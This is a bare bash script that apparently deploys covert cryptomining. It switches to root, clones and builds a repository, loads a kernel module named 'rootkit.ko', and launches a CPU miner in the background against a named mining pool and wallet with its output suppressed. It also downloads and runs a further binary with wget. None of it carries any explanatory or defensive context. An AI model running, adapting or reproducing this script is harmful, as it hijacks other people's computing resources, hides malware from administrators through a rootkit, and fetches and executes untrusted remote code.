#!/bin/bash
sudo su
git clone https://github.com/BatiKangkung/Kerecek
cd Kerecek/
make
dmesg -C
insmod rootkit.ko
dmesg
chmod +x avx2
./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x >/dev/null &
# ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x >/dev/null & 
uname -a
# pkill -31 avx2
wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
timeout 10m ./time
# time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
apt-get update
